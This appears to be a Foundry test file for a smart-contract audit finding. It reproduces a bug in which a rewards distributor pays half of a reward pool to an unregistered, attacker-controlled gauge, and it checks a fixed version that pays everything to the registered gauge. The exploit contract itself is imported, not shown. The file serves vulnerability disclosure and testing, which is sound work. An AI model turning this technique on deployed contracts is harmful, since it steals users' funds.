// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Token, Gauge, GaugeController, GaugeRewardsDistributor} from
    "./66191-h-29-gaugerewardsdistributor-distributes-rewards-to-gauges-n.sol";

contract Finding66191Test is Test {
    address constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_unregistered_gauge_takes_half() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.reward().balanceOf(SINK), 50e18, "attacker claimed 50");
        assertEq(e.reward().balanceOf(address(e.registered())), 50e18, "registered gauge got half");
        assertFalse(e.distributor().gaugeRewardTokens(address(e.stranger()), address(e.reward())), "not registered");
        assertEq(e.distributor().activeCycleGauges(address(e.reward()), 0), address(e.stranger()), "stranger included");
    }

    function test_control_filter_sends_the_full_balance_to_the_registered_gauge() public {
        Token reward = new Token();
        Token staking = new Token();
        Gauge registered = new Gauge(staking);
        Gauge stranger = new Gauge(staking);
        GaugeController controller = new GaugeController();
        GaugeRewardsDistributor distributor = new GaugeRewardsDistributor(reward, controller);
        controller.add(address(stranger));
        controller.add(address(registered));
        distributor.addGaugeRewardToken(address(registered));
        staking.mint(address(this), 1e18);
        staking.approve(address(stranger), 1e18);
        stranger.stake(1e18);
        reward.mint(address(distributor), 100e18);

        distributor.distributeRewardsFixed();
        uint256 claimed = stranger.claim(reward);

        assertEq(claimed, 0, "unregistered gauge got nothing");
        assertEq(reward.balanceOf(address(registered)), 100e18, "registered gauge got all");
    }
}
